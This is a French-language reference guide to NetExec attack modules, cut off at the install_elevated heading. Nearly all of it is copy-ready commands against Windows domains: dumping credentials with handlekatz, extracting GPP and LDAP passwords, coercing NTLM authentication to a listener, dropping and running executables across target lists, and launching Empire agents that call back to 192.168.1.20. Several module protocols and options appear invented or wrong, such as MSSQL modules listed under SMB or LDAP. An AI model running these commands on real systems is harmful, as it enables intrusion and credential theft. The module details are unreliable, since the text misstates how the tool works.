# Modules

### Documentation des Modules NetExec

Voici une documentation complète et détaillée de chaque module de NetExec, classée par ordre alphabétique. Chaque module est accompagné d'une description, du protocole pris en charge, des paramètres, des exemples de commandes typiques, ainsi que des usages avancés.

***

#### Module : `adcs`

**1. Nom du Module : `adcs`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d'exploiter les Active Directory Certificate Services (ADCS) pour obtenir des certificats ou des informations sensibles.

**2. Options / Paramètres**

* `--CERTTEMPLATE` : Nom du modèle de certificat à utiliser.
* `--DC` : Contrôleur de domaine cible.
* `--OUTPUT` : Fichier de sortie pour les certificats obtenus.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M adcs -o CERTTEMPLATE=UserTemplate
```

**Explication** :

* Cette commande utilise le module `adcs` pour demander un certificat à l'Active Directory Certificate Services, avec le modèle `UserTemplate`.

**Commande avec fichier de sortie** :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M adcs -o CERTTEMPLATE=UserTemplate,OUTPUT=cert.pfx
```

**Explication** :

* Les certificats sont sauvegardés dans le fichier `cert.pfx`.

**4. Commandes Avancées**

Commande pour spécifier un contrôleur de domaine particulier :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M adcs -o CERTTEMPLATE=UserTemplate,DC=dc.example.com
```

**Explication** :

* Exécute le module en ciblant le contrôleur de domaine `dc.example.com`.

***

#### Module : `add-computer`

**1. Nom du Module : `add-computer`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d'ajouter un compte machine à un domaine Active Directory.

**2. Options / Paramètres**

* `--COMPUTERNAME` : Nom du compte machine à ajouter.
* `--PASSWORD` : Mot de passe associé au compte machine.
* `--DC` : Contrôleur de domaine cible.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M add-computer -o COMPUTERNAME=NewComputer,PASSWORD=Password123
```

**Explication** :

* Ajoute un compte machine nommé `NewComputer` avec le mot de passe `Password123` sur le contrôleur de domaine spécifié.

**4. Commandes Avancées**

Commande avec spécification d'un contrôleur de domaine :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M add-computer -o COMPUTERNAME=NewComputer,PASSWORD=Password123,DC=dc.example.com
```

**Explication** :

* Ajoute le compte machine sur le contrôleur de domaine `dc.example.com`.

***

#### Module : `bitlocker`

**1. Nom du Module : `bitlocker`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge les cibles pour collecter des informations sur BitLocker, y compris les clés de récupération.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour sauvegarder les informations collectées.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc smb 192.168.1.10 -u admin -p 'password' -M bitlocker
```

**Explication** :

* Récupère les informations BitLocker de la cible à l’adresse `192.168.1.10`.

**Commande avec fichier de sortie** :

```bash
nxc smb 192.168.1.10 -u admin -p 'password' -M bitlocker -o OUTPUT=bitlocker_info.txt
```

**Explication** :

* Sauvegarde les informations collectées dans `bitlocker_info.txt`.

**4. Commandes Avancées**

Commande avec sortie détaillée :

```bash
nxc smb 192.168.1.10 -u admin -p 'password' -M bitlocker -o VERBOSE=1
```

**Explication** :

* Fournit une sortie plus détaillée des informations collectées.

***

#### Module : `coerce_plus`

**1. Nom du Module : `coerce_plus`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module utilise des méthodes de coercition pour forcer une cible à s’authentifier sur un autre hôte.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur où rediriger l’authentification.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc smb 192.168.1.10 -M coerce_plus -o LISTEN=192.168.1.20
```

**Explication** :

* Utilise la coercition pour forcer la cible `192.168.1.10` à s’authentifier sur l’hôte `192.168.1.20`.

**Commande avec sortie détaillée** :

```bash
nxc smb 192.168.1.10 -M coerce_plus -o LISTEN=192.168.1.20,VERBOSE=1
```

**Explication** :

* Fournit une sortie détaillée pour le débogage.

**4. Commandes Avancées**

Commande multi-cibles :

```bash
nxc smb targets.txt -M coerce_plus -o LISTEN=192.168.1.20
```

**Explication** :

* Applique la coercition à toutes les cibles listées dans `targets.txt`.

***

#### Module : `daclread`

**1. Nom du Module : `daclread`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module extrait les listes de contrôle d'accès discrétionnaire (DACL) pour des objets Active Directory spécifiés.

**2. Options / Paramètres**

* `--OBJECT` : Nom de l'objet cible pour lequel les DACL doivent être extraits.
* `--DC` : Contrôleur de domaine cible.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M daclread -o OBJECT=CN=Users,DC=example,DC=com
```

**Explication** :

* Extrait les DACL pour l'objet `CN=Users,DC=example,DC=com` depuis le contrôleur de domaine spécifié.

**4. Commandes Avancées**

Commande avec spécification d'un contrôleur de domaine :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M daclread -o OBJECT=CN=Users,DC=example,DC=com,DC=dc.example.com
```

**Explication** :

* Extrait les DACL pour un objet spécifique et les récupère depuis `dc.example.com`.

***

#### Module : `dfscoerce`

**1. Nom du Module : `dfscoerce`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exploite une vulnérabilité dans le service DFS pour forcer une authentification NTLM sur un autre hôte.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les authentifications NTLM.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M dfscoerce -o LISTEN=192.168.1.20
```

**Explication** :

* Exploite la vulnérabilité DFS pour forcer une authentification NTLM de la cible `192.168.1.10` vers l’hôte `192.168.1.20`.

**4. Commandes Avancées**

Commande avec sortie détaillée :

```
nxc smb 192.168.1.10 -M dfscoerce -o LISTEN=192.168.1.20,VERBOSE=1
```

**Explication** :

* Fournit des informations supplémentaires pendant l'exécution du module.

***

#### Module : `drop-sc`

**1. Nom du Module : `drop-sc`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet de déposer un fichier de service sur une cible Windows via SMB.

**2. Options / Paramètres**

* `--FILE` : Chemin local vers le fichier à déposer sur la cible.
* `--TARGETPATH` : Chemin distant où le fichier sera déposé.
* `--EXECUTE` : Indique si le fichier doit être exécuté après dépôt (valeurs : `true` ou `false`).

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M drop-sc -o FILE=/path/to/file.exe,TARGETPATH=C:\Windows\Temp\file.exe
```

**Explication** :

* Dépose le fichier `file.exe` dans le répertoire temporaire de la cible.

**Commande avec exécution automatique** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M drop-sc -o FILE=/path/to/file.exe,TARGETPATH=C:\Windows\Temp\file.exe,EXECUTE=true
```

**Explication** :

* Après dépôt, exécute automatiquement le fichier déposé.

**4. Commandes Avancées**

Commande multi-cibles avec exécution automatique :

```
nxc smb targets.txt -M drop-sc -o FILE=/path/to/file.exe,TARGETPATH=C:\Windows\Temp\file.exe,EXECUTE=true
```

**Explication** :

* Dépose et exécute le fichier sur toutes les cibles listées dans `targets.txt`.

***

#### Module : `empire_exec`

**1. Nom du Module : `empire_exec`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exécute un agent Empire sur une cible via SMB.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte Empire où les agents doivent se connecter.
* `--PORT` : Port à utiliser pour la communication avec Empire.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M empire_exec -o LISTEN=192.168.1.20,PORT=8080
```

**Explication** :

* Lance un agent Empire sur la cible et configure la connexion vers l’hôte `192.168.1.20` via le port `8080`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M empire_exec -o LISTEN=192.168.1.20,PORT=8080
```

**Explication** :

* Exécute un agent Empire sur toutes les cibles définies dans `targets.txt`.

***

#### Module : `enum_av`

**1. Nom du Module : `enum_av`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d'énumérer les solutions antivirus présentes sur une cible Windows.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M enum_av
```

**Explication** :

* Énumère les antivirus installés sur la cible `192.168.1.10`.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M enum_av -o OUTPUT=antivirus_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `antivirus_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie vers fichier unique :

```
nxc smb targets.txt -M enum_av -o OUTPUT=all_antivirus_list.txt
```

**Explication** :

* Compile les antivirus détectés sur toutes les cibles dans un fichier unique.

***

#### Module : `enum_ca`

**1. Nom du Module : `enum_ca`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les autorités de certification (Certificate Authorities) disponibles dans Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_ca
```

**Explication** :

* Énumère les autorités de certification disponibles sur le contrôleur de domaine spécifié.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_ca -o OUTPUT=ca_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `ca_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie détaillée :

```
nxc ldap targets.txt -M enum_ca -o OUTPUT=all_ca_list.txt
```

**Explication** :

* Regroupe les autorités de certification énumérées sur toutes les cibles définies dans `targets.txt` dans un fichier unique.

***

#### Module : `enum_dns`

**1. Nom du Module : `enum_dns`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module interroge Active Directory pour énumérer les enregistrements DNS.

**2. Options / Paramètres**

* `--ZONE` : Zone DNS à interroger (par défaut : toutes les zones).
* `--OUTPUT` : Fichier de sortie pour sauvegarder les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_dns
```

**Explication** :

* Énumère tous les enregistrements DNS dans Active Directory pour la cible spécifiée.

**Commande pour une zone spécifique** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_dns -o ZONE=example.com
```

**Explication** :

* Limite l'interrogation aux enregistrements DNS pour la zone `example.com`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc ldap targets.txt -M enum_dns -o OUTPUT=dns_records_all.txt
```

**Explication** :

* Compile les enregistrements DNS de toutes les cibles dans un seul fichier de sortie.

***

#### Module : `enum_impersonate`

**1. Nom du Module : `enum_impersonate`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les comptes avec des droits d’usurpation d'identité sur un domaine Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_impersonate
```

**Explication** :

* Énumère les comptes avec des droits d’usurpation sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_impersonate -o OUTPUT=impersonate_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `impersonate_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc ldap targets.txt -M enum_impersonate -o OUTPUT=all_impersonate_list.txt
```

**Explication** :

* Regroupe les résultats des comptes d’usurpation de toutes les cibles dans un seul fichier de sortie.

***

#### Module : `enum_links`

**1. Nom du Module : `enum_links`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d’énumérer les liens entre serveurs sur Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_links
```

**Explication** :

* Énumère les liens de serveur sur la cible Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_links -o OUTPUT=links_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `links_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc ldap targets.txt -M enum_links -o OUTPUT=all_links_list.txt
```

**Explication** :

* Compile les liens de serveurs énumérés sur toutes les cibles dans un fichier unique.

***

#### Module : `enum_logins`

**1. Nom du Module : `enum_logins`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d’énumérer les sessions de connexion actives sur un hôte cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M enum_logins
```

**Explication** :

* Énumère les connexions actives sur la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M enum_logins -o OUTPUT=logins_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `logins_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc smb targets.txt -M enum_logins -o OUTPUT=all_logins_list.txt
```

**Explication** :

* Compile les connexions actives détectées sur toutes les cibles dans un fichier unique.

***

#### Module : `enum_trusts`

**1. Nom du Module : `enum_trusts`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les relations de confiance entre domaines Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_trusts
```

**Explication** :

* Énumère les relations de confiance entre domaines sur la cible Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_trusts -o OUTPUT=trusts_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `trusts_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc ldap targets.txt -M enum_trusts -o OUTPUT=all_trusts_list.txt
```

**Explication** :

* Compile les relations de confiance détectées sur toutes les cibles dans un fichier unique.

***

#### Module : `exec_on_link`

**1. Nom du Module : `exec_on_link`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d’exécuter des commandes ou des fichiers binaires via des liens inter-serveurs sur un réseau cible.

**2. Options / Paramètres**

* `--COMMAND` : Commande ou fichier à exécuter.
* `--LINK` : Nom du lien inter-serveur à utiliser pour exécuter la commande.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M exec_on_link -o COMMAND="whoami",LINK=example-link
```

**Explication** :

* Exécute la commande `whoami` via le lien nommé `example-link`.

**Commande avec spécification avancée** :

```
nxc smb 192.168.1.10 -M exec_on_link -o COMMAND="C:\\path\\to\\script.bat",LINK=example-link
```

**Explication** :

* Exécute un script batch à l’emplacement spécifié via le lien inter-serveur donné.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M exec_on_link -o COMMAND="dir",LINK=example-link
```

**Explication** :

* Exécute la commande `dir` sur toutes les cibles spécifiées via le lien inter-serveur `example-link`.

***

#### Module : `find-computer`

**1. Nom du Module : `find-computer`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet de rechercher des objets ordinateur dans Active Directory en fonction de critères spécifiques.

**2. Options / Paramètres**

* `--FILTER` : Critère de filtrage des objets (par défaut : tous les objets ordinateur).
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M find-computer
```

**Explication** :

* Liste tous les objets ordinateur dans le domaine Active Directory spécifié.

**Commande avec filtre** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M find-computer -o FILTER="OU=Sales"
```

**Explication** :

* Recherche les objets ordinateur dans l’unité organisationnelle `Sales`.

**4. Commandes Avancées**

Commande avec sortie détaillée :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M find-computer -o FILTER="OU=HR",OUTPUT=computers_list.txt
```

**Explication** :

* Enregistre la liste des ordinateurs trouvés dans `computers_list.txt`.

***

#### Module : `firefox`

**1. Nom du Module : `firefox`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module collecte les informations de configuration et les données sensibles associées à Firefox sur un hôte cible.

**2. Options / Paramètres**

* `--PROFILE` : Spécifie le chemin du profil Firefox (par défaut : profil par défaut).
* `--OUTPUT` : Fichier de sortie pour sauvegarder les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M firefox
```

**Explication** :

* Extrait les données associées à Firefox depuis le profil par défaut de l’hôte cible.

**Commande avec profil spécifique** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M firefox -o PROFILE="C:\\Users\\User\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\profile"
```

**Explication** :

* Spécifie un chemin de profil Firefox personnalisé pour extraire les données.

**4. Commandes Avancées**

Commande avec sauvegarde des résultats :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M firefox -o OUTPUT=firefox_data.txt
```

**Explication** :

* Sauvegarde les données extraites dans `firefox_data.txt`.

***

#### Module : `get-desc-users`

**1. Nom du Module : `get-desc-users`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d'extraire les descriptions associées aux comptes utilisateurs dans Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-desc-users
```

**Explication** :

* Extrait les descriptions de tous les utilisateurs dans le domaine Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-desc-users -o OUTPUT=descriptions.txt
```

**Explication** :

* Sauvegarde les descriptions des utilisateurs dans `descriptions.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M get-desc-users -o OUTPUT=all_descriptions.txt
```

**Explication** :

* Compile les descriptions des utilisateurs pour toutes les cibles dans un fichier unique.

***

#### Module : `get-network`

**1. Nom du Module : `get-network`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les informations sur le réseau et les sous-réseaux disponibles dans Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-network
```

**Explication** :

* Énumère les sous-réseaux et autres informations réseau de l’Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-network -o OUTPUT=network_info.txt
```

**Explication** :

* Sauvegarde les informations réseau collectées dans `network_info.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M get-network -o OUTPUT=all_networks.txt
```

**Explication** :

* Compile les informations réseau de toutes les cibles dans un fichier unique.

***

#### Module : `get-unixUserPassword`

**1. Nom du Module : `get-unixUserPassword`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module récupère les mots de passe des utilisateurs Unix configurés dans un domaine Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-unixUserPassword
```

**Explication** :

* Extrait les mots de passe des utilisateurs Unix configurés dans Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-unixUserPassword -o OUTPUT=unix_passwords.txt
```

**Explication** :

* Sauvegarde les mots de passe extraits dans `unix_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M get-unixUserPassword -o OUTPUT=all_unix_passwords.txt
```

**Explication** :

* Compile les mots de passe des utilisateurs Unix pour toutes les cibles dans un fichier unique.

***

#### Module : `get-userPassword`

**1. Nom du Module : `get-userPassword`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module extrait les mots de passe des utilisateurs configurés dans Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-userPassword
```

**Explication** :

* Extrait les mots de passe des utilisateurs configurés dans Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-userPassword -o OUTPUT=user_passwords.txt
```

**Explication** :

* Sauvegarde les mots de passe extraits dans `user_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M get-userPassword -o OUTPUT=all_user_passwords.txt
```

**Explication** :

* Compile les mots de passe des utilisateurs pour toutes les cibles dans un fichier unique.

***

#### Module : `get_netconnections`

**1. Nom du Module : `get_netconnections`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module énumère les connexions réseau actives sur un hôte cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M get_netconnections
```

**Explication** :

* Énumère les connexions réseau actives sur l’hôte cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M get_netconnections -o OUTPUT=connections_list.txt
```

**Explication** :

* Sauvegarde les connexions détectées dans `connections_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M get_netconnections -o OUTPUT=all_connections_list.txt
```

**Explication** :

* Compile les connexions réseau actives détectées sur toutes les cibles dans un fichier unique.

***

#### Module : `gpp_autologin`

**1. Nom du Module : `gpp_autologin`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche les informations d’autologin configurées via Group Policy Preferences (GPP) sur les hôtes cibles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M gpp_autologin
```

**Explication** :

* Recherche les configurations d’autologin sur l’hôte cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M gpp_autologin -o OUTPUT=autologin_info.txt
```

**Explication** :

* Sauvegarde les informations détectées dans `autologin_info.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M gpp_autologin -o OUTPUT=all_autologin_info.txt
```

**Explication** :

* Compile les configurations d’autologin détectées sur toutes les cibles dans un fichier unique.

***

#### Module : `gpp_password`

**1. Nom du Module : `gpp_password`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module récupère les mots de passe stockés dans les Group Policy Preferences (GPP) sur les hôtes cibles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M gpp_password
```

**Explication** :

* Recherche et récupère les mots de passe des GPP configurés sur l’hôte cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M gpp_password -o OUTPUT=gpp_passwords.txt
```

**Explication** :

* Sauvegarde les mots de passe détectés dans `gpp_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M gpp_password -o OUTPUT=all_gpp_passwords.txt
```

**Explication** :

* Compile les mots de passe détectés sur toutes les cibles dans un fichier unique.

***

#### Module : `group-mem`

**1. Nom du Module : `group-mem`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module liste les membres d'un groupe Active Directory spécifique.

**2. Options / Paramètres**

* `--GROUP` : Nom du groupe cible.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M group-mem -o GROUP=Administrators
```

**Explication** :

* Liste les membres du groupe `Administrators` sur le domaine Active Directory spécifié.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M group-mem -o GROUP=Administrators,OUTPUT=members.txt
```

**Explication** :

* Sauvegarde les membres du groupe dans `members.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M group-mem -o GROUP=Administrators,OUTPUT=all_members.txt
```

**Explication** :

* Compile les membres du groupe `Administrators` pour toutes les cibles dans un fichier unique.

***

#### Module : `groupmembership`

**1. Nom du Module : `groupmembership`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les appartenances à tous les groupes pour un utilisateur spécifique.

**2. Options / Paramètres**

* `--USER` : Nom de l’utilisateur cible.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M groupmembership -o USER=john.doe
```

**Explication** :

* Énumère les appartenances aux groupes pour l’utilisateur `john.doe` sur le domaine Active Directory spécifié.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M groupmembership -o USER=john.doe,OUTPUT=groups.txt
```

**Explication** :

* Sauvegarde les appartenances aux groupes dans `groups.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M groupmembership -o USER=john.doe,OUTPUT=all_groups.txt
```

**Explication** :

* Compile les appartenances aux groupes pour l’utilisateur `john.doe` sur toutes les cibles dans un fichier unique.

***

#### Module : `handlekatz`

**1. Nom du Module : `handlekatz`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exécute la collecte des informations d’identification à l’aide de Mimikatz sur une cible distante.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les informations collectées.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M handlekatz
```

**Explication** :

* Exécute Mimikatz sur la cible pour récupérer les informations d’identification.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M handlekatz -o OUTPUT=credentials.txt
```

**Explication** :

* Sauvegarde les informations d’identification récupérées dans `credentials.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M handlekatz -o OUTPUT=all_credentials.txt
```

**Explication** :

* Compile les informations d’identification collectées sur toutes les cibles dans un fichier unique.

***

#### Module : `hyperv-host`

**1. Nom du Module : `hyperv-host`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les configurations des hôtes Hyper-V sur un domaine Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M hyperv-host
```

**Explication** :

* Extrait les informations de configuration des hôtes Hyper-V sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M hyperv-host -o OUTPUT=hyperv_hosts.txt
```

**Explication** :

* Sauvegarde les configurations des hôtes Hyper-V dans `hyperv_hosts.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M hyperv-host -o OUTPUT=all_hyperv_hosts.txt
```

**Explication** :

* Compile les informations des hôtes Hyper-V de toutes les cibles dans un fichier unique.

***

#### Module : `iis`

**1. Nom du Module : `iis`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d'interroger les serveurs IIS (Internet Information Services) pour collecter des informations sur leurs configurations.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M iis
```

**Explication** :

* Interroge le serveur IIS sur la cible pour collecter des informations de configuration.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M iis -o OUTPUT=iis_config.txt
```

**Explication** :

* Sauvegarde les configurations IIS collectées dans `iis_config.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M iis -o OUTPUT=all_iis_configs.txt
```

**Explication** :

* Compile les configurations IIS de toutes les cibles dans un fichier unique.

***

#### Module : `impersonate`

**1. Nom du Module : `impersonate`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d'exploiter des permissions pour usurper un contexte utilisateur spécifique sur un hôte cible.

**2. Options / Paramètres**

* `--USER` : Nom de l’utilisateur à usurper.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M impersonate -o USER=john.doe
```

**Explication** :

* Tente d’usurper le contexte de l’utilisateur `john.doe` sur la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M impersonate -o USER=john.doe,OUTPUT=impersonate_results.txt
```

**Explication** :

* Sauvegarde les résultats de l’usurpation dans `impersonate_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M impersonate -o USER=john.doe,OUTPUT=all_impersonate_results.txt
```

**Explication** :

* Compile les résultats de l’usurpation pour toutes les cibles dans un fichier unique.

***

#### Module : `install_elevated`

